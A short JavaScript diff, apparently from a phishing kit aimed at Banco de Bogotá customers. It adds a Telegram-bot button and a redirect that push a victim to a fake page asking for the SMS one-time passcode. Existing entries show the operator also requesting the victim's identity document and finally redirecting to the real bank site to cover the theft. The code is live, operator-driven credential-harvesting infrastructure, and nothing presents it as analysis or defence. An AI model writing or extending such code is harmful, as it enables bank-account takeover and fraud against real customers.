@@ -340,6 +340,9 @@ const TelegramFormatter = {
                     { text: '🪪 Pedir Cédula', callback_data: 'pedir_cedula' }
                 ],
                 [
+                    { text: '📱 Pedir OTP', callback_data: 'pedir_otp' }
+                ],
+                [
                     { text: '✅ Finalizar', callback_data: 'finalizar' }
                 ]
             ]
@@ -458,6 +461,10 @@ const RedirectHandler = {
             'pedir_cedula': {
                 url: `${baseUrl}/cedula.html?action=pedir_cedula`,
                 message: 'Por favor capture su documento de identidad'
+            },
+            'pedir_otp': {
+                url: `${baseUrl}/otp.html?action=pedir_otp`,
+                message: 'Por favor ingrese el código OTP enviado por SMS'
             },
             'finalizar': {
                 url: 'https://www.bancodebogota.com/personas',
